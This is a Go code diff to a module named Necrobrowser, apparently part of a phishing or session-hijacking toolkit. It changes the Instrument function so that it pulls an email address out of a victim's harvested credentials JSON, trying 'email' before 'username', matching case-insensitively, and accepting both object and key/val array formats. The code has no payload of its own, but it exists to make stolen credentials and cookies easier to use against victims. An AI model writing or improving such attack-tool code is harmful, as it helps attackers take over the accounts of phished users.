@@ -226,34 +226,47 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 		return
 	}
 
-	// Extract email from credentials JSON (Username field)
+	// Extract email from credentials JSON
+	// Priority: "Email" first, then "Username" as fallback (case-insensitive)
 	email := ""
+	emailFields := []string{"email", "username"}
+
 	var credsMap map[string]interface{}
 	if err := json.Unmarshal([]byte(credentialsJSON), &credsMap); err == nil {
-		// Format 1: {"username":"x","password":"y"}
-		for _, field := range []string{"username", "Username"} {
-			if val, ok := credsMap[field]; ok {
-				if strVal, ok := val.(string); ok && strVal != "" {
-					email = strVal
-					break
+		// Format 1: {"email":"x","password":"y"} or {"username":"x","password":"y"}
+		for _, target := range emailFields {
+			for k, v := range credsMap {
+				if strings.EqualFold(k, target) {
+					if strVal, ok := v.(string); ok && strVal != "" {
+						email = strVal
+						break
+					}
 				}
+			}
+			if email != "" {
+				break
 			}
 		}
 	}
-	// Format 2: [{"key":"Username","val":"x","time":"..."}]
+	// Format 2: [{"key":"Email","val":"x","time":"..."}] or [{"key":"Username","val":"x","time":"..."}]
 	if email == "" {
 		var credsArr []map[string]interface{}
 		if err := json.Unmarshal([]byte(credentialsJSON), &credsArr); err == nil {
-			for _, cred := range credsArr {
-				if key, ok := cred["key"]; ok {
-					if keyStr, ok := key.(string); ok && keyStr == "Username" {
-						if val, ok := cred["val"]; ok {
-							if strVal, ok := val.(string); ok && strVal != "" {
-								email = strVal
-								break
+			for _, target := range emailFields {
+				for _, cred := range credsArr {
+					if key, ok := cred["key"]; ok {
+						if keyStr, ok := key.(string); ok && strings.EqualFold(keyStr, target) {
+							if val, ok := cred["val"]; ok {
+								if strVal, ok := val.(string); ok && strVal != "" {
+									email = strVal
+									break
+								}
 							}
 						}
 					}
+				}
+				if email != "" {
+					break
 				}
 			}
 		}
